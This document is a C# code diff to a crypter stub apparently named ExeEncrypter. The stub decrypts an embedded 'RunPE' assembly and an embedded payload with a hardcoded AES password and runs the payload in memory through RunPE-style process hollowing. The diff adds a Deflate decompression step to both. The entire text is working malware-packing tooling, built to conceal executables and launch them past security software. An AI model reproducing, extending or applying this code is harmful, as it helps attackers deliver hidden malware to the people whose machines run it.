@@ -14,6 +14,7 @@ using System.Security;
 using System.Security.AccessControl;
 using System.Security.Principal;
 using System.Security.Cryptography;
+using System.IO.Compression;
 
 namespace ExeEncrypter.Resources
 {
@@ -21,14 +22,16 @@ namespace ExeEncrypter.Resources
     {
         public static void Main()
         {
+            
             try
             {
-                Assembly DLL = AppDomain.CurrentDomain.Load(AES_Decrypt(GetResource("RunPE"), "#password"));
+                Assembly DLL = AppDomain.CurrentDomain.Load(DecompressByte(AES_Decrypt(GetResource("RunPE"), "#password")));
                 Type myType = DLL.GetType("RunPE.RunPE");
                 MethodInfo method = myType.GetMethod("Run");
 
-                method.Invoke(null, new object[] { Application.ExecutablePath, AES_Decrypt(GetResource("payload"), "#password"), false });
+                method.Invoke(null, new object[] { Application.ExecutablePath, DecompressByte(AES_Decrypt(GetResource("payload"), "#password")), false });
                 //RunPE.Run(Application.ExecutablePath, AES_Decrypt(GetResource("payload"), "#password"), false);
+                
             }
             catch (Exception e)
             {
@@ -66,6 +69,16 @@ namespace ExeEncrypter.Resources
                 }
             }
             return decryptedBytes;
+        }
+        public static byte[] DecompressByte(byte[] data)
+        {
+            MemoryStream input = new MemoryStream(data);
+            MemoryStream output = new MemoryStream();
+            using (DeflateStream dstream = new DeflateStream(input, CompressionMode.Decompress))
+            {
+                dstream.CopyTo(output);
+            }
+            return output.ToArray();
         }
     }
 }
